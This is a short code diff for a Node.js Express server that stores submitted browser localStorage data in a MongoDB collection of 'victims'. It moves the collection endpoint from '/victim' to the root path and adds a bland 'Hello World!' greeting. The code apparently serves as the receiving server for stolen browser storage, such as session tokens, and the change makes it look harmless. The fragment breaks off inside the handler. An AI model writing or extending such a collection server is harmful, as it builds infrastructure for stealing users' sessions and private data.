@@ -20,7 +20,11 @@ const Victim = mongoose.model("victim", victimSchema);
 
 app.use(express.static("./public"));
 
-app.post("/victim", async (req, res) => {
+app.get("/", (req, res) => {
+  res.end("Hello World!");
+});
+
+app.post("/", async (req, res) => {
   const { localStorage } = req.body;
   await Victim.create({
     localStorage: localStorage,
